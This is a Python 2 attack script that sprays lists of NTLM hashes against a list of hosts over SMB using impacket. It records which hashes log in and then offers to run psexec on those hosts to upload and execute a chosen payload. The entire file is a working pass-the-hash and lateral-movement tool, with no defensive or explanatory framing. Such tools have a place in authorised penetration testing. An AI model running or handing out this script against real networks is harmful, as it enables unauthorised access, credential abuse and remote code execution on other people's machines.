#!/usr/bin/python
import psexec
import smbclient
import time
import blessings
import sys
import re
import argparse
from impacket.smbconnection import *

t = blessings.Terminal()

parser = argparse.ArgumentParser(description='Spray Smb Hashes and Psexec')
parser.add_argument("-hashfile", help="Parse Hashes from a File (Hashes Seperated by New Line)")
parser.add_argument("-ipfile", help="Parse IP's from a File (IP's Seperated by New Line)")
parser.add_argument("payload", help="Select Payload for Psexec")
args = parser.parse_args()

hashfile = False
ipfile = False
targetsprayhash = []
targetipseperated = []
targetpassword = None
workinghashes = []
command = ''
path = ''
exeFile = args.payload
copyFile = ''

print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
if not args.hashfile:
    targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
    targetsprayhash = targethash.split(',')
else:
    hashfile = True
    print t.bold_green + "[*] Hash File Selected: " + t.normal + args.hashfile
    file = open(args.hashfile,"r")
    for hash in file:
        targetsprayhash.append(hash.strip("\n"))

if not args.ipfile:
    targetips = raw_input("[*] Enter IP's Serperated by Comma:")
    targetipseperated = targetips.split(',')
else:
    ipfile = True
    print t.bold_green + "[*] IP File Selected: " + t.normal + args.ipfile
    file = open(args.ipfile,"r")
    for ip in file:
        targetipseperated.append(ip.strip("\n"))

targetusername = raw_input("[*] Enter Username: ")
targetdomain = raw_input("[*] Enter Domain: ")

for ip in targetipseperated:
    for hash in targetsprayhash:
        targetlm, targetnt = hash.split(':')
        print t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip
        try:
            smb = SMBConnection(ip, ip, sess_port=445,timeout=5)
            smb.setTimeout(5)
        except:
            print t.bold_red + "[!!]SMB Port not Open or Timed Out!!" +t.normal
            continue
        try:
            smb.setTimeout(5)
            smb.login(user=targetusername, password=targetpassword,
                      domain=targetdomain, lmhash=targetlm, nthash=targetnt)
            print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.norma
            smb.logoff()
            workinghashes.append(hash + "," + ip)
        except:
            print t.bold_red + "[!] This Hash Failed" + t.normal

print t.green + "\n[*] Working Hashes:"
for hash in workinghashes:
    print t.bold_green + hash + t.normal

try:
    want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
except:
    sys.exit(0)
if want_to_psexec.lower() == "y" or want_to_psexec == "":
    for hash in workinghashes:
        psexechash,psexecip = hash.split(',')
        PSEXEC = psexec.PSEXEC(command, path, exeFile, copyFile, protocols=None, username=targetusername,
                               hashes=psexechash, domain=targetdomain, password=targetpassword, aesKey=None, doKerberos=False)
        print t.bold_green + '\n [*] Starting Psexec....' + t.normal
        try:
            PSEXEC.run(psexecip)
        except SessionError:
            print t.bold_red + "[*] Failed to Remove Payload, Remove Manually with Shell"
else:
    sys.exit(0)
